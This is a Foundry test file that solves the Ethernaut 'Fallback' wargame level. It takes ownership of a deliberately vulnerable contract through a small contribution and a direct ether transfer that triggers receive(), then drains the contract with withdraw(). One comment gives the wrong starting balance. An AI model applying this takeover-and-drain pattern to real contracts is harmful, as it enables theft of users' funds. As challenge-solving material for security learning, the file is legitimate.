// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallback} from "src/01/Fallback.sol";

contract FallbackTest is Test {

    Fallback public level = new Fallback();
    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
      vm.deal(hacker, 0.0001 ether);
      vm.prank(instance);
    }

    function testFallbackHack() public {

        ////////////////////////////////////////
        //                                    //
        //        STEP 1: RECON               //
        //                                    //
        ////////////////////////////////////////

        ///////////////////////////////////////////
        // Should show the address of the instance
        //////////////////////////////////////////
        emit log_address(instance);
        emit log_address(level.owner());

        ///////////////////////////////////
        // Both should be 0, one is the 
        // array contributions[msg.sender], 
        // the other is the owner's balance
        ///////////////////////////////////
        emit log_uint(level.getContribution());
        emit log_uint(instance.balance);

        ///////////////////////////////////
        // Should be 1 ether as set above
        // (1000000000000000000)
        ///////////////////////////////////
        emit log_address(hacker);
        emit log_uint(hacker.balance);
        
        ////////////////////////////////////////
        //                                    //
        //        STEP 2: contribute()        //
        //                                    //
        ////////////////////////////////////////

        ////////////////////////////////////////
        // contribute with msg.sender to hacker
        ////////////////////////////////////////
        vm.startPrank(hacker);

        level.contribute{value: 1 wei}();

        /////////////////////////////////// 
        // Should be 999999999999999999 and
        // contributions[msg.sender] is 1
        ///////////////////////////////////
        emit log_uint(hacker.balance);
        emit log_uint(level.getContribution());

        ////////////////////////////////////////
        //                                    //
        //    STEP 3: TRIGGER FALLBACK        //
        //                                    //
        ////////////////////////////////////////

        /////////////////////////////////////
        // call send() to trigger receive(), 
        // hacker should be the owner
        /////////////////////////////////////
        (bool sent, ) = address(level).call{value: 1 wei}("");
        require(sent, "Failed to call send()");

        assertEq(level.owner(), hacker);

        ////////////////////////////////////////
        //                                    //
        //     STEP 4: DRAIN CONTRACT         //
        //                                    //
        ////////////////////////////////////////
        level.withdraw();

        vm.stopPrank();

      }
}
